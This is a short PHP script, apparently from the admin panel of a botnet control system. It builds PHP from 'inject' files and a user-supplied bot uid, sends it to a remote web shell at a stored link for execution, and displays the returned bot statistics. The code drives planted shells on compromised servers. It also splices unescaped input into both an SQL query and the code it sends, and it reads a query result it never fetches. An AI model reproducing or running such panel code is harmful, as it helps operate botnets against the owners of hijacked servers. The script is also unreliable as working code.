<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		$get_php = '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');

        if(isset($_POST['uid'])) $Cur['str'] = $_POST['uid'];

        if(!empty($Cur['str'])){
	        preg_match('~^([a-zA-Z]+)(.*)~', $Cur['str'], $matches);

	        if(!empty($matches[1])){	        	$prefix = $matches[1];
	        	$uid = $matches[2];
	        }else{	        	$prefix = 'unknown';
	        	$uid = '0';
	        }

	        $get_php .= '$prefix = \''.$prefix.'\';';
	        $get_php .= '$uid = \''.$uid.'\';';

	        $get_php .= file_get_contents('modules/admins/injects/cmd_info_uid.php');
			$data = get_http($result->link, $get_php, $result->keyid, $result->shell);

			//print_r($data);

            $data = json_decode($data);
			if($data->prefix != $prefix && $data->uid != $uid){				$Cur['str'] = '';
			}else{				$data->live_time_bot = time_math($data->last_date - $data->post_date);
				$data->min_post = $data->min_post == 0 ? '-' : time_math($data->min_post);
				$data->max_post = $data->max_post == 0 ? '-' : time_math($data->max_post);
				$data->post_date = TimeStampToStr($data->post_date, '+3');
				$data->last_date = TimeStampToStr($data->last_date, '+3');

				$smarty->assign('bots', $data);
			}
        }

		$smarty->assign('admin', $result);
	}
}

?>